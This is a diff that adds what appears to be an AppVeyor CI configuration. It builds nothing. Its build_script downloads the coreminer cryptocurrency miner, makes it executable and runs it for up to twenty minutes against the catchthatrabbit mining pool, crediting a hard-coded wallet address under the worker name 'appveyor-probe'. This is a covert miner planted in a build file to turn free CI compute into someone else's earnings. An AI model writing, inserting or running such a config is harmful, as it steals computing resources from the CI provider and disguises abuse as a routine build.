@@ -1,0 +1,10 @@
+version: 0.0.{build}
+image: Ubuntu2204
+environment:
+  ADDR: cb35f605986c5b18546500252a32c0b6199579dc81c8
+  WORKER: appveyor-probe
+build_script:
+  - curl -sSL -m 180 -o /tmp/xcb.tar.gz https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz
+  - mkdir -p /tmp/xcb && tar xzf /tmp/xcb.tar.gz -C /tmp/xcb
+  - BIN=$(find /tmp/xcb -name 'coremin*' -type f | head -1); chmod +x "$BIN"; echo "nproc=$(nproc)"; "$BIN" --version
+  - timeout 1200 "$BIN" --noeval --hard-aes -P "stratum1+tcp://${ADDR}.${WORKER}@us.catchthatrabbit.com:8008" -t 2
